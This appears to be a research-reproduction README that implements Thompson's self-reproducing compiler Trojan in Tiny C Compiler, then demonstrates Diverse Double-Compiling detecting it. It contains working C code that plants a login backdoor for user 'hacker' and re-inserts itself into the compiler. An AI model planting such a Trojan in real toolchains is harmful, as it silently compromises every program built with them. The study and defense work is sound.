# Reproducing Trusting Trust Attack and It's Defense(Diverse Double Compiling) with Tiny C Compiler.

This repo aims to reproduce the diverse double-compiling procedure described in section 4 of this paper [Countering Trusting Trust through Diverse Double-Compiling](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.364.116&rep=rep1&type=pdf).



## Experiments

### Enviroment

Ubuntu 18.04.5 LTS, kernel 5.4.0-53-generic 

On VirtualBox 6.1.12r139181

Gcc 7.5.0

Tiny c compiler from this [repo](https://github.com/TinyCC/tinycc).



### Step1: Write a login.c program

`./login/login.c` is the file we want to hack. 

If the username is `tom` or `jerry` and the corresponding pasword is correct, the login will be authorized, otherwise rejected.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NUM 2

char* username_list[] = {"tom", "jerry"};
char* password_list[] = {"1", "2"};

int main(int argc, char* argv[]) {
  if(argc < 3) {
    printf("Too few arguments!\n");
    return 0;
  }

  char* username = argv[1];
  char* password = argv[2];

  for(int i = 0; i < NUM; i++) {
    if(strcmp(username, username_list[i]) == 0
    && strcmp(password, password_list[i]) == 0) {
      printf("welcome!\n");
      return 0;
    }
  }

  printf("Reject!\n");
  return 0;
}
```

Then test it:

```bash
$zmx cd ./login
$zmx gcc -o login.out login.c
$zmx ./login.out tom 1
welcome!
$zmx ./login.out hacker 1
Reject!
```

The login.c will reject username `hacker`.



### Step2: Write a login_hacked.c program

These are lines added on the basis of login.c. We want our malicious compiler do the same job.

```c
	}
	
+	if(strcmp(username, "hacker") == 0) {
+		printf("welcome!\n");
+		return 0;
+	}
	printf("Reject!\n");
```

Then test it:

```bash
$zmx gcc -o login_hacked.out login_hacked.c
$zmx ./login_hacked.out tom 1
welcome!
$zmx ./login_hacked.out hacker 1
welcome!
```

Now `hacker` can be authorised.



### Step3: Download tcc and set up the environment

Directory `tinycc-clean` is the clean version of tcc source code, cloned from https://github.com/TinyCC/tinycc. It serves as a reference and helps to see what we have modified in `tinycc-tohack` and `tinycc-hack-itself`.

Directory `tinycc-tohack` is another clean version, but not identical to `tinycc-clean`. I increased the `IO_BUF_SIZE` in `tcc.h` so that the compiler can read in all the content of `tccpp.c` at once. Theoretically this is not allowed in real world DDC process, but without it the file will be divided into several block and processed in multiple loops, which will bring a lot of difficulty when hacking.

```bash
zmx$ diff tinycc-clean/tcc.h tinycc-tohack/tcc.h 
583c583
< #define IO_BUF_SIZE 8192
---
> #define IO_BUF_SIZE 120000
```

Directory `tinycc-hack-itself` is the compiler able to hack `login.c` and itself, I will introduce it later.



### Step4: Modify the compiler so that it can hack login.c as well as itself

This step actually consists of two sub steps. Firstly I added Trojan horse in order to hack `login.c`, secondly I added another Trojan horse that insert these two Trojan horse in the binary of tcc when it's compiling itself. 

First of all I found the location the file is read is `tccpp.c:616`, thereby I added two Trojan horses between line 616 and line 617 to insert the malicious code into `bf->buffer`.

```c
611: #if defined(PARSE_DEBUG)
612:             len = 1;
613: #else
614:             len = IO_BUF_SIZE;
615: #endif
  
616:             len = read(bf->fd, bf->buffer, len);
// Code inserted here
617:             if (len < 0)
618:                 len = 0;
619:         } else {
620:             len = 0;
621:         }
```



Trojan horses I inserted to `tccpp.c` is shown below. The comments is added to explain the code, they will not appear in the source code. 

```c
  // The reason I added counters for login.c and tccpp.c is I found the file may be visited multiple times, but the hack should only happen in the first time.
  // The indentation of static int counter1 = 0; should be adjusted to insert an identical malicaous code to itself. But this is not essential because indentation doesn't affect the binary of C.
  static int counter1 = 0;
  static int counter2 = 0;

  /* The source code to hack login.c */
  // The string to be inserted into login.c
  const char* inject_login = "if(strcmp(username, %chacker%c) == 0) {%c    printf(%cwelcome!%cn%c);%c    return 0;%c  }%c  ";
  // If the file being preprocessed is login.c, then hack.
  if(strstr(file->filename, "login.c") != NULL && counter1 == 0) {
    unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 200);
    snprintf(inject_code, 200, inject_login, 34, 34, 10, 34, 92, 34, 10, 10, 10);
    int inject_len = strlen(inject_login);
    unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);
    // Get the location we want to insert, in this case we want to insert malicious code before it prints "Reject!".
    unsigned char* inject_location = strstr(bf->buffer, "printf(\"Reject!");
    int pre_inject_len = inject_location - bf->buffer;
    
    // This line should have been deleted. Previously I add a space at the very beginning to avoid revisiting the same file. But since I adopted a counter to handle this, this line doesn't make sense anymore.
    new_buf[0] = ' ';
    strncpy(new_buf + 1, bf->buffer, pre_inject_len);
    strncpy(new_buf + pre_inject_len + 1, inject_code, inject_len);
    strcat(new_buf, inject_location);
    len = len + inject_len - 9;
    strncpy(bf->buffer, new_buf, len);
    bf->buffer[len] = 0;
    tcc_free(inject_code);
    tcc_free(new_buf);
    // Increament counter so the hack will never happen again.
    counter1++;
  }


  /* The source code to insert itself to tccpp.c, make malicious tcc self-perpetuating. */
  // Inject_compiler is the string able to represent the whose code block I want to insert.
  const char* inject_compiler = 
    "static int counter1 = 0;%c  static int counter2 = 0;%c  const char* inject_login = %c%s%c;%c  if(strstr(file->filename, %clogin.c%c) != NULL && counter1 == 0) {%c    unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 200);%c    snprintf(inject_code, 200, inject_login, 34, 34, 10, 34, 92, 34, 10, 10, 10);%c    int inject_len = strlen(inject_login);%c    unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);%c    unsigned char* inject_location = strstr(bf->buffer, %cprintf(%c%cReject!%c);%c    int pre_inject_len = inject_location - bf->buffer;%c    new_buf[0] = %c %c;%c    strncpy(new_buf + 1, bf->buffer, pre_inject_len);%c    strncpy(new_buf + pre_inject_len + 1, inject_code, inject_len);%c    strcat(new_buf, inject_location);%c    len = len + inject_len - 9;%c    strncpy(bf->buffer, new_buf, len);%c    bf->buffer[len] = 0;%c    tcc_free(inject_code);%c    tcc_free(new_buf);%c    counter1++;%c  }%c  if(strstr(file->filename, %ctccpp.c%c) != NULL && counter2 == 0) {%c  const char* inject_compiler = %c    %c%s%c;%c    unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 9900);%c    snprintf(inject_code, 9900, inject_compiler, 10, 10, 34, inject_login, 34, 10, 34, 34, 10, 10, 10, 10, 10, 34, 92, 34, 34, 10, 10, 39, 39, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 34, inject_compiler, 34, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10);%c    int inject_len = strlen(inject_code);%c    unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);%c    memset(new_buf, 0, sizeof(unsigned char) * IO_BUF_SIZE);%c    unsigned char* inject_location = strstr(bf->buffer, %cif (len < 0)%c);%c    int pre_inject_len = inject_location - bf->buffer;%c    strncpy(new_buf, bf->buffer, pre_inject_len);%c    strncpy(new_buf + pre_inject_len, inject_code, inject_len);%c    strcat(new_buf, inject_location);%c    len = len + inject_len - 1;%c    strncpy(bf->buffer, new_buf, len + 2);%c    bf->buffer[len + 2] = 0;%c    tcc_free(inject_code);%c    tcc_free(new_buf);%c    counter2++;%c  }%c            ";
  if(strstr(file->filename, "tccpp.c") != NULL && counter2 == 0) {
    unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 9900);
    snprintf(inject_code, 9900, inject_compiler, 10, 10, 34, inject_login, 34, 10, 34, 34, 10, 10, 10, 10, 10, 34, 92, 34, 34, 10, 10, 39, 39, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 34, inject_compiler, 34, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10);
    int inject_len = strlen(inject_code);
    unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);
    memset(new_buf, 0, sizeof(unsigned char) * IO_BUF_SIZE);
    unsigned char* inject_location = strstr(bf->buffer, "if (len < 0)");
    int pre_inject_len = inject_location - bf->buffer;
    strncpy(new_buf, bf->buffer, pre_inject_len);
    strncpy(new_buf + pre_inject_len, inject_code, inject_len);
    strcat(new_buf, inject_location);
    len = len + inject_len - 1;
    strncpy(bf->buffer, new_buf, len + 2);
    bf->buffer[len + 2] = 0;
    // Avoid memory leak, because absence of tcc_free() led to some tricky bugs.
    tcc_free(inject_code);
    tcc_free(new_buf);
    counter2++;
  }
```

This step cost 90% of my time and I have to do a lot of compromise to get it finished. For example, I condensed inject_compiler into a single line because its multi-line version is beyond its representation. Thus, it looks messy and confusing every time when I try modifying it.



### Step5: Do the regeneration check

DDC can work only if the tiny c compiler is able to compile itself and generate a stable binary.

I used gcc to compile `tinycc-hack-itself` and then utilized the compiled tcc to compile `tinycc-tohack`.

To reduce of risk of potential divergence, I use `-O0` all the time and deleted `-g` flag.

```bash
$zmx cd ./tinycc-hack-itself
$zmx ./configure --cc=gcc
$zmx make
$zmx sudo make install
// now /usr/local/bin/tcc is tinycc-hack-itself compiled by gcc

$zmx cd ../tinycc-tohack
$zmx ./configure --cc=tcc
$zmx make
$zmx sudo make install
// now /usr/local/bin/tcc is tinycc-tohack compiled by tinycc-hack-itself
$zmx md5sum /usr/local/bin/tcc
421734c517902f86556356bb7a16a7fc  /usr/local/bin/tcc

$zmx make clean
$zmx make
$zmx sudo make install
// now /usr/local/bin/tcc is tinycc-tohack compiled by tinycc-tohack(hacked)
$zmx md5sum /usr/local/bin/tcc
421734c517902f86556356bb7a16a7fc  /usr/local/bin/tcc
// here we can see the malicious binary from tinycc-hack-itself can successfully regenerate itself given a clean tcc.
```

The result `421734c517902f86556356bb7a16a7fc` corresponds to the case that the original binary is malicious tcc.

### Step6: Check if the current tcc able to hack login.c

```bash
$zmx cd ../login
$zmx tcc -o login.out login.c
$zmx ./login.out hacker 1
welcome!
```

The `login.c` can be sucessfully hacked.



### Step7: DDC

Since we have known the malicious binary is `421734c517902f86556356bb7a16a7fc`, to show the effectiveness of DDC, we also need to know the checksum of clean binary.

First, we need a clean version compiled by tcc.

```bash
$zmx ./configure --cc=gcc
$zmx make clean
$zmx make
$zmx sudo make install
// now /usr/local/bin/tcc is tinycc-tohack compiled by gcc
$zmx md5sum /usr/local/bin/tcc
b074c582ef1ee3653d5622aeaaf65ae2  /usr/local/bin/tcc

$zmx ./configure --cc=tcc
$zmx make clean
$zmx make
$zmx sudo make install
// now /usr/local/bin/tcc is tinycc-tohack compiled by tinycc-tohack(clean)
$zmx md5sum /usr/local/bin/tcc
2e59ecc0900b7c37a8d37915012a2b51  /usr/local/bin/tcc

// let's do one more time
$zmx make clean
$zmx make
$zmx sudo make install
// now /usr/local/bin/tcc is tinycc-tohack compiled by tinycc-tohack(clean)
$zmx md5sum /usr/local/bin/tcc
2e59ecc0900b7c37a8d37915012a2b51  /usr/local/bin/tcc

// the binary converged to a stable version.
```

The second compilation result `2e59ecc0900b7c37a8d37915012a2b51` corresponds to the case that the original binary is clean gcc.

Simultaneously, the converged result(third result) `2e59ecc0900b7c37a8d37915012a2b51` corresponds to the case that the original binary is clean tcc.

As a result, the clean versions form both trusted gcc or clean tcc give identical output, while the DDC output of a malicious tcc in step5 differs from those from clean original binaries.

DDC works!

## Reflection

Theoretically the malicious code can be inserted in any compiling stage, but the stage when files are read is easiest to implement. However, in general compiler a file, especially an extremely large file might be read multiple times, each time a fixed length is read, stored and processed. This makes it much more difficult to insert the Trojan horse in that a lot of array offset and memory copy issues need to be considered. To achieve the goal in a short time, I sidestepped this by adjusting the `IO_BUF_SIZE` to a big enough number, thereby the whole content of `tccpp.c` can be read at once. However, in real world hacking there is no short cut like that, and definitely the real world compiler is far more complicated that a toy compiler in terms of processing the files.



The feature of two compiler might differ a lot, when the `Makefile` gets larger,  we will have less confidence to say that it will do identical task with different compilers. For instance, I found that when using gcc binary, a debug info can be included if we declare `-g` in compiling stage. While when we use tcc to obtain a binary with debug info, we have to declare `-g` in both compiling stage and linking stage. Moreover, I feel very lucky that there is no non-deterministic logic in tiny c compiler, such as timestamps and random values, otherwise uncertainty will interfere the test.



From the perspective of a hacker, It's even not easy to hack a toy compiler like tiny c compiler. In regeneration test I got a segfault when compiling clean tcc with hacked tcc, since the compiler is buggy, the debug info can't represent the true location of the segfault. Thanks to Valgrind, I managed to eliminate all memory leak issues and had tcc regenerate it successfully. 



As a tester of C compiler, I don't need to worry about if the trusted compiler I choose has also been subverted, because there are a variety of C compilers availabe on the internet, it's nearly impossible for hackers to hack them all and make any two of them produce identical output in DDC, it's an O(n^2) process. However, when it comes to a less popular programming language, the situation is still far from optimistic. For some programming languages there are very few alternative compilers and it's much easier for hacker to compromise them all and pass the DCC test.

## Reference

Papers

https://www.cs.cmu.edu/~rdriley/487/papers/Thompson_1984_ReflectionsonTrustingTrust.pdf

http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.364.116&rep=rep1&type=pdf

Source

https://bellard.org/tcc/

https://github.com/TinyCC/tinycc

Video

https://www.youtube.com/watch?v=nQLUtCpt8-4

https://www.youtube.com/watch?v=T82JttlJf60







